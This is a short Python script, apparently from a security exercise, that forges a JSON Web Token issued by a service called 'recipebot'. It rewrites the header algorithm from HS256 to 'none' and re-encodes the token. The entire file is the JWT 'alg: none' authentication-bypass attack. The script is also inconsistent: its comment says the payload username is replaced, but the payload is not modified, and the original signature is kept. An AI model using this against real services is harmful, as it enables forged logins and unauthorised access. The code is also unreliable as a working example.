import base64


jwt = b'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1ODI1NjIwMTAsImlhdCI6MTU4MjU1ODQxMCwiaXNzIjoicmVjaXBlYm90IiwibmJmIjoxNTgyNTU4NDEwLCJzdWIiOiI2NzY4N2NmYS1kZDRkLTQ2ZDYtYWM3NS1jMWIzYWQ4YTBkZGQifQ.eJmbryEF7Cb7bo0c5wPc9LN3X3CZLo6e5xjg1Q-Hm_w'
header, payload, signature  = jwt.split(b'.')

# Replacing the ALGO and the payload username
header = base64.b64decode(header).replace(b'HS256', b'none')
payload = base64.b64decode(payload + b'==')

header = base64.b64encode(header).strip().replace(b'=', b'')
payload = base64.b64encode(payload).strip().replace(b'=', b'')

# 'The algorithm 'none' is not supported'
print(header + b"." + payload + b"." + signature)
